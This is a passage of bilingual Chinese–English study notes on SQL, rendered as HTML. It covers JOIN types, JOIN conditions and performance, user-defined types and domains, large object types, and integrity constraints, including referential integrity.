<h3 id="note-db-sql-inner-join">INNER JOIN<a class="headerlink" href="#note-db-sql-inner-join" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>作用</strong>：返回两个表中匹配的行。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#note-db-sql-__codelineno-92-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">columns</span>
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#note-db-sql-__codelineno-92-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#note-db-sql-__codelineno-92-3"></a><span class="k">INNER</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">table2</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">table1</span><span class="p">.</span><span class="k">column</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">table2</span><span class="p">.</span><span class="k">column</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-left-join-left-outer-join">LEFT JOIN (LEFT OUTER JOIN)<a class="headerlink" href="#note-db-sql-left-join-left-outer-join" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>作用</strong>：返回左表所有行 + 右表匹配的行（未匹配的右表字段为 <code>NULL</code>）。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#note-db-sql-__codelineno-93-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">columns</span>
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#note-db-sql-__codelineno-93-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#note-db-sql-__codelineno-93-3"></a><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">table2</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">table1</span><span class="p">.</span><span class="k">column</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">table2</span><span class="p">.</span><span class="k">column</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-right-join-right-outer-join">RIGHT JOIN (RIGHT OUTER JOIN)<a class="headerlink" href="#note-db-sql-right-join-right-outer-join" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>作用</strong>：返回右表所有行 + 左表匹配的行（未匹配的左表字段为 <code>NULL</code>）。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#note-db-sql-__codelineno-94-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">columns</span>
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#note-db-sql-__codelineno-94-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#note-db-sql-__codelineno-94-3"></a><span class="k">RIGHT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">table2</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">table1</span><span class="p">.</span><span class="k">column</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">table2</span><span class="p">.</span><span class="k">column</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-full-outer-join">FULL OUTER JOIN<a class="headerlink" href="#note-db-sql-full-outer-join" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>作用</strong>：返回左右表所有行（未匹配的字段为 <code>NULL</code>）。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#note-db-sql-__codelineno-95-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">columns</span>
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#note-db-sql-__codelineno-95-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#note-db-sql-__codelineno-95-3"></a><span class="k">FULL</span><span class="w"> </span><span class="k">OUTER</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">table2</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">table1</span><span class="p">.</span><span class="k">column</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">table2</span><span class="p">.</span><span class="k">column</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-cross-join">CROSS JOIN<a class="headerlink" href="#note-db-sql-cross-join" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>作用</strong>：返回两表的笛卡尔积（无连接条件）。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#note-db-sql-__codelineno-96-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">columns</span>
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#note-db-sql-__codelineno-96-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#note-db-sql-__codelineno-96-3"></a><span class="k">CROSS</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">table2</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-self-join">SELF JOIN<a class="headerlink" href="#note-db-sql-self-join" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>作用</strong>：将表与自身连接，常用于层级或对称关系查询。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#note-db-sql-__codelineno-97-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="k">column</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="k">column</span>
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#note-db-sql-__codelineno-97-2"></a><span class="k">FROM</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">a</span>
</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#note-db-sql-__codelineno-97-3"></a><span class="k">JOIN</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="k">column</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="k">column</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-join-condition">JOIN condition<a class="headerlink" href="#note-db-sql-join-condition" title="Permanent link">&para;</a></h3>
<h4 id="note-db-sql-on">ON<a class="headerlink" href="#note-db-sql-on" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>作用</strong>：指定任意连接条件（支持多条件和复杂逻辑）。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#note-db-sql-__codelineno-98-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span>
</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#note-db-sql-__codelineno-98-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">orders</span>
</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#note-db-sql-__codelineno-98-3"></a><span class="k">JOIN</span><span class="w"> </span><span class="n">customers</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">orders</span><span class="p">.</span><span class="n">customer_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">customers</span><span class="p">.</span><span class="n">id</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<h4 id="note-db-sql-using">USING<a class="headerlink" href="#note-db-sql-using" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>作用</strong>：简化同名列的连接（自动匹配列名）。</li>
<li><strong>语法</strong>：
  <div class="language-sql highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#note-db-sql-__codelineno-99-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span>
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#note-db-sql-__codelineno-99-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span>
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#note-db-sql-__codelineno-99-3"></a><span class="k">JOIN</span><span class="w"> </span><span class="n">departments</span><span class="w"> </span><span class="k">USING</span><span class="w"> </span><span class="p">(</span><span class="n">dept_id</span><span class="p">);</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="note-db-sql-join-performance-optimization">JOIN performance optimization<a class="headerlink" href="#note-db-sql-join-performance-optimization" title="Permanent link">&para;</a></h3>
<ol>
<li><strong>索引优化</strong>：  </li>
<li>在连接列（如 <code>dept_id</code>）上创建索引。</li>
<li><strong>减少数据量</strong>：  </li>
<li>先通过 <code>WHERE</code> 过滤再 <code>JOIN</code>。</li>
<li><strong>避免笛卡尔积</strong>：  </li>
<li>确保 <code>CROSS JOIN</code> 是必要且可控的。</li>
<li><strong>使用 EXPLAIN</strong>：  </li>
<li>分析查询计划，检查连接顺序和算法（如 Nested Loop、Hash Join）。</li>
</ol>
<hr />
<h3 id="note-db-sql-summary">Summary<a class="headerlink" href="#note-db-sql-summary" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th>JOIN 类型</th>
<th>匹配规则</th>
<th>是否保留未匹配数据</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>INNER JOIN</code></td>
<td>仅匹配的行</td>
<td>否</td>
</tr>
<tr>
<td><code>LEFT JOIN</code></td>
<td>左表全保留 + 右表匹配</td>
<td>左表未匹配行保留</td>
</tr>
<tr>
<td><code>RIGHT JOIN</code></td>
<td>右表全保留 + 左表匹配</td>
<td>右表未匹配行保留</td>
</tr>
<tr>
<td><code>FULL OUTER JOIN</code></td>
<td>左右表全保留</td>
<td>左右表未匹配行均保留</td>
</tr>
<tr>
<td><code>CROSS JOIN</code></td>
<td>无条件，笛卡尔积</td>
<td>不适用</td>
</tr>
</tbody>
</table>
<h2 id="note-db-sql-advanced-sql">Advanced SQL<a class="headerlink" href="#note-db-sql-advanced-sql" title="Permanent link">&para;</a></h2>
<h3 id="note-db-sql-sql-data-types-and-schemas">SQL Data Types and Schemas<a class="headerlink" href="#note-db-sql-sql-data-types-and-schemas" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://www.postgresql.org/docs/current/datatype.html">Built-in types</a></li>
</ul>
<h4 id="note-db-sql-user-defined-types">User-defined types<a class="headerlink" href="#note-db-sql-user-defined-types" title="Permanent link">&para;</a></h4>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#note-db-sql-__codelineno-100-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TYPE</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
</span></code></pre></div>
也可以定义复合类型</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#note-db-sql-__codelineno-101-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TYPE</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#note-db-sql-__codelineno-101-2"></a><span class="w">    </span><span class="n">street</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#note-db-sql-__codelineno-101-3"></a><span class="w">    </span><span class="n">city</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#note-db-sql-__codelineno-101-4"></a><span class="p">);</span>
</span></code></pre></div>
<p>Create a table with the address type:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#note-db-sql-__codelineno-102-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#note-db-sql-__codelineno-102-2"></a><span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span>
</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#note-db-sql-__codelineno-102-3"></a><span class="w">    </span><span class="n">name</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#note-db-sql-__codelineno-102-4"></a><span class="w">    </span><span class="n">person_address</span><span class="w"> </span><span class="n">address</span>
</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#note-db-sql-__codelineno-102-5"></a><span class="p">);</span>
</span></code></pre></div>
<p>Drop the address type:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#note-db-sql-__codelineno-103-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">TYPE</span><span class="w"> </span><span class="n">address</span><span class="p">;</span>
</span></code></pre></div>
<h4 id="note-db-sql-create-new-domain">Create new domain<a class="headerlink" href="#note-db-sql-create-new-domain" title="Permanent link">&para;</a></h4>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#note-db-sql-__codelineno-104-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">DOMAIN</span><span class="w"> </span><span class="n">domain_name</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">data_type</span>
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#note-db-sql-__codelineno-104-2"></a><span class="p">[</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="n">default_value</span><span class="w"> </span><span class="p">]</span>
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#note-db-sql-__codelineno-104-3"></a><span class="p">[</span><span class="w"> </span><span class="k">CONSTRAINT</span><span class="w"> </span><span class="k">constraint_name</span><span class="w"> </span><span class="k">CHECK</span><span class="w"> </span><span class="p">(</span><span class="n">expression</span><span class="p">)</span><span class="w"> </span><span class="p">];</span>
</span></code></pre></div>
<p>such as
<div class="language-sql highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#note-db-sql-__codelineno-105-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">domain</span><span class="w"> </span><span class="n">Dollars</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">numeric</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">null</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#note-db-sql-__codelineno-105-2"></a><span class="k">Create</span><span class="w"> </span><span class="k">domain</span><span class="w"> </span><span class="n">Pounds</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">numeric</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#note-db-sql-__codelineno-105-3"></a><span class="k">Create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">employee</span><span class="w"> </span>
</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#note-db-sql-__codelineno-105-4"></a><span class="w">        </span><span class="p">(</span><span class="n">eno</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#note-db-sql-__codelineno-105-5"></a><span class="w">            </span><span class="n">ename</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-105-6"><a id="__codelineno-105-6" name="__codelineno-105-6" href="#note-db-sql-__codelineno-105-6"></a><span class="w">            </span><span class="n">job</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-105-7"><a id="__codelineno-105-7" name="__codelineno-105-7" href="#note-db-sql-__codelineno-105-7"></a><span class="w">            </span><span class="n">salary</span><span class="w"> </span><span class="n">Dollars</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-105-8"><a id="__codelineno-105-8" name="__codelineno-105-8" href="#note-db-sql-__codelineno-105-8"></a><span class="w">            </span><span class="n">comm</span><span class="w"> </span><span class="n">Pounds</span><span class="p">);</span><span class="w"> </span>
</span></code></pre></div></p>
<div class="admonition note">
<p class="admonition-title">domain vs type</p>
<p>在 SQL 中，<code>DOMAIN</code> 和 <code>TYPE</code> 都用于定义自定义的数据类型，但它们有不同的用途和特性。</p>
<p><code>DOMAIN</code> 是基于现有数据类型的约束集合。它允许你为特定的数据类型添加约束条件，以确保数据的完整性。
主要用于在多个表中重用相同的数据类型和约束。例如，定义一个 <code>DOMAIN</code> 来表示电子邮件地址，并附加格式检查约束。
可以附加 <code>CHECK</code> 约束来验证数据的有效性。
<code>DOMAIN</code> 继承了基础数据类型的所有特性，并可以在其上添加额外的约束。
示例:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#note-db-sql-__codelineno-106-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">DOMAIN</span><span class="w"> </span><span class="n">email_domain</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#note-db-sql-__codelineno-106-2"></a><span class="k">CHECK</span><span class="w"> </span><span class="p">(</span><span class="n">VALUE</span><span class="w"> </span><span class="o">~</span><span class="w"> </span><span class="s1">&#39;^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$&#39;</span><span class="p">);</span>
</span></code></pre></div></p>
<p><code>TYPE</code> 是用于定义新的数据类型，特别是复合类型（包含多个字段）或枚举类型。
适用于需要定义复杂数据结构的场景，例如需要在表中存储地址信息的多个字段。
复合类型可以包含多个字段，每个字段可以有不同的数据类型。
枚举类型可以定义一组固定的值。
示例:
复合类型:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#note-db-sql-__codelineno-107-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TYPE</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#note-db-sql-__codelineno-107-2"></a><span class="w">    </span><span class="n">street</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#note-db-sql-__codelineno-107-3"></a><span class="w">    </span><span class="n">city</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#note-db-sql-__codelineno-107-4"></a><span class="w">    </span><span class="n">zip_code</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span id="__span-107-5"><a id="__codelineno-107-5" name="__codelineno-107-5" href="#note-db-sql-__codelineno-107-5"></a><span class="p">);</span>
</span></code></pre></div>
枚举类型:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#note-db-sql-__codelineno-108-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TYPE</span><span class="w"> </span><span class="n">mood</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">ENUM</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;happy&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;sad&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;neutral&#39;</span><span class="p">);</span>
</span></code></pre></div></p>
</div>
<h4 id="note-db-sql-large-object-types">Large object types<a class="headerlink" href="#note-db-sql-large-object-types" title="Permanent link">&para;</a></h4>
<p>SQL provides two types of large object data types:</p>
<ul>
<li>
<p><code>BLOB</code> (Binary Large Object)</p>
<ul>
<li>Stores large collections of uninterpreted binary data</li>
<li>Examples: images, videos, CAD files</li>
<li>Interpretation is handled by external applications</li>
<li>Maximum size depends on DBMS implementation</li>
</ul>
</li>
<li>
<p><code>CLOB</code> (Character Large Object) </p>
<ul>
<li>Stores large collections of character/text data</li>
<li>Examples: documents, XML files, long text</li>
<li>Data is interpreted as character strings</li>
<li>Maximum size depends on DBMS implementation</li>
</ul>
</li>
</ul>
<p>When querying large objects, the database returns a pointer/reference to the data rather than the full object itself. This helps optimize performance and memory usage.</p>
<p>Example usage:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#note-db-sql-__codelineno-109-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#note-db-sql-__codelineno-109-2"></a><span class="w">    </span><span class="n">sid</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#note-db-sql-__codelineno-109-3"></a><span class="w">    </span><span class="n">name</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>
</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#note-db-sql-__codelineno-109-4"></a><span class="w">    </span><span class="n">gender</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#note-db-sql-__codelineno-109-5"></a><span class="w">    </span><span class="n">photo</span><span class="w"> </span><span class="nb">blob</span><span class="p">(</span><span class="mi">20</span><span class="n">MB</span><span class="p">),</span>
</span><span id="__span-109-6"><a id="__codelineno-109-6" name="__codelineno-109-6" href="#note-db-sql-__codelineno-109-6"></a><span class="w">    </span><span class="n">cv</span><span class="w"> </span><span class="k">clob</span><span class="p">(</span><span class="mi">10</span><span class="n">KB</span><span class="p">)</span>
</span><span id="__span-109-7"><a id="__codelineno-109-7" name="__codelineno-109-7" href="#note-db-sql-__codelineno-109-7"></a><span class="p">);</span>
</span></code></pre></div>
<figure>
<img alt="" src="../NOTE/DB/img/asql-1.png" width="500" />
</figure>
<h3 id="note-db-sql-integrity-constraints_1">Integrity Constraints<a class="headerlink" href="#note-db-sql-integrity-constraints_1" title="Permanent link">&para;</a></h3>
<p>Integrity constraints guard against accidental damage to the database, by ensuring that authorized changes to the database do not result in a loss of data consistency. </p>
<ul>
<li>实体完整性、参照完整性和用户定义的完整性约束 </li>
<li>完整性约束是数据库实例(Instance)必须遵循的 </li>
<li>完整性约束由DBMS维护 </li>
</ul>
<div class="admonition extra">
<p class="admonition-title">Extra</p>
<p>Constraints on a single relation：</p>
<ul>
<li>Not null</li>
<li>Unique</li>
<li>Primary key</li>
<li>Foreign key</li>
<li>Check(Predicate)</li>
</ul>
<p>Eg.
<div class="language-sql highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#note-db-sql-__codelineno-110-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">branch2</span><span class="w"> </span>
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#note-db-sql-__codelineno-110-2"></a><span class="p">(</span><span class="n">branch_name</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#note-db-sql-__codelineno-110-3"></a><span class="n">branch_city</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">30</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#note-db-sql-__codelineno-110-4"></a><span class="n">assets</span><span class="w"> </span><span class="nb">integer</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#note-db-sql-__codelineno-110-5"></a><span class="k">check</span><span class="w"> </span><span class="p">(</span><span class="n">assets</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">100</span><span class="p">))</span><span class="w"> </span>
</span></code></pre></div></p>
</div>
<h4 id="note-db-sql-domain-constraints">Domain Constraints<a class="headerlink" href="#note-db-sql-domain-constraints" title="Permanent link">&para;</a></h4>
<p>The check clause in SQL-92 permits domains to be restricted: 
<div class="language-sql highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#note-db-sql-__codelineno-111-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">domain</span><span class="w"> </span><span class="n">hourly</span><span class="o">-</span><span class="n">wage</span><span class="w"> </span><span class="nb">numeric</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#note-db-sql-__codelineno-111-2"></a><span class="k">Constraint</span><span class="w"> </span><span class="n">value</span><span class="o">-</span><span class="n">test</span><span class="w"> </span><span class="k">check</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">.</span><span class="mi">00</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#note-db-sql-__codelineno-111-3"></a><span class="c1">--The clause constraint value-test is optional; useful to indicate which constraint an update violated. </span>
</span></code></pre></div>
为约束命名可以更容易地诊断问题；</p>
<h4 id="note-db-sql-referential-integrity">Referential Integrity<a class="headerlink" href="#note-db-sql-referential-integrity" title="Permanent link">&para;</a></h4>
<p>Let <span class="arithmatex">\(r_1(R_1)\)</span> and <span class="arithmatex">\(r_2(R_2)\)</span> be the relations with primary keys <span class="arithmatex">\(K_1\)</span> and <span class="arithmatex">\(K_2\)</span>, respectively. </p>
<p>The subset <span class="arithmatex">\(\alpha\)</span> of <span class="arithmatex">\(R_2\)</span> is a foreign key referencing <span class="arithmatex">\(K_1\)</span> in relation <span class="arithmatex">\(r_1\)</span>, if for every <span class="arithmatex">\(t_2\)</span> in <span class="arithmatex">\(r_2\)</span> there must be a tuple <span class="arithmatex">\(t_1\)</span> in <span class="arithmatex">\(r_1\)</span> such that <span class="arithmatex">\(t_1[K_1] = t_2[\alpha]\)</span>. </p>
<div class="arithmatex">\[
    \forall t_2 \in r_2, \exists t_1 \in r_1, t_1[K_1] = t_2[\alpha]
\]</div>
<p>Referential integrity constraint also called subset dependency, since its can be written as </p>
<div class="arithmatex">\[
    \Pi_{\alpha}(r_2) \subseteq \Pi_{K_1}(r_1)
\]</div>
<p>在这里<span class="arithmatex">\(r_2\)</span>是参照关系(referencing relation)，<span class="arithmatex">\(r_1\)</span>是被参照关系(referenced relation)。</p>
<p>参照关系中外码的值必须在被参照关系中实际存在，或为null. </p>
